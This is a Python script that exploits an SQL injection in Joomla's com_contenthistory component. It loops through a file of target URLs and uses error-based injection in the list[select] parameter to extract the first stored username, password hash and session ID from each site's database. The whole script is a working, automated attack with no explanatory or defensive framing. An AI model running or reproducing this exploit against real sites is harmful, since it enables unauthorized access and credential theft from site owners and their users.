#!/usr/bin/python
# -*- coding:utf-8 -*-
import requests,re
keu = r"Duplicate entry \'(.*?)\' for key \'group_key\' SQL=SELECT \(select 1 from \(select count\(\*\).concat\(\(select \(select concat\(username\)\)"
uu = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(username)) from %23__users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
url = open('urls.txt','r')
for u in url:
	u = u.strip()
	print u + "*"*20
	ks = requests.get(str(u) + str(uu),timeout=15)
	if ks.status_code == 500:
		if ks.content.find('Duplicate entry')!=-1:
			a = re.findall(keu,ks.content)
			for b in a:
				print u + ' username is ' + b
				p = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(password)) from %23__users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
				ks = requests.get(str(u) + str(p),timeout=15)
				key = r"Duplicate entry \'(.*?)\' for key \'group_key\' SQL=SELECT \(select 1 from \(select count\(\*\).concat\(\(select \(select concat\(password\)\)"
				k = re.findall(key,ks.content)
				for s in k:
					print u + ' password is ' + s
					sess = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(session_id)) from %23__session limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
					ks = requests.get(str(u) + str(sess),timeout=15)
					if ks.content.find('default'):
						print 'session_id no found'
					else:
						kes = r"Duplicate entry \'(.*?)\' for key \'group_key\' SQL=SELECT \(select 1 from \(select count\(\*\).concat\(\(select \(select concat\(session_id\)\)"
						n = re.findall(kes,ks.content)
						for m in n:
							print u + ' session_id is ' + m
